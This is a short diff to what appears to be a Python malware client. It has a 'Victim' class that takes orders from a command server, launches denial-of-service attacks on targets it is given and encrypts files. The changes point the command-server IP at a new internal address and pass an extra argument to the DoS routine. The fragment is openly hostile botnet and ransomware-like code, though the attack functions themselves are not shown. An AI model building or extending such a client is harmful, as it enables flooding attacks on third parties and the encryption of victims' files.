@@ -13,7 +13,7 @@ PORT = 3838
 VICTIM_LISTEN_PORT = 4848
 #SERVER_IP = "10.195.114.134"
 # XXX CHANGE THIS
-SERVER_IP = "127.0.0.1"
+SERVER_IP = "10.193.109.154"
 
 # SHOULD PROBABLY MAKE A MSG PARSER OR SOMETHING
 # XXXXX
@@ -43,7 +43,7 @@ class Victim(object):
         # "IP"
         # Sleep for 0.1 since it will drop the majority of packets
         print "Target for dos attack %s" % str(msg[0])
-        dos(msg[0])
+        dos(msg[0], msg[1])
 
     def process_encrypt_files(self, msg):
         print "Encrypting files..."
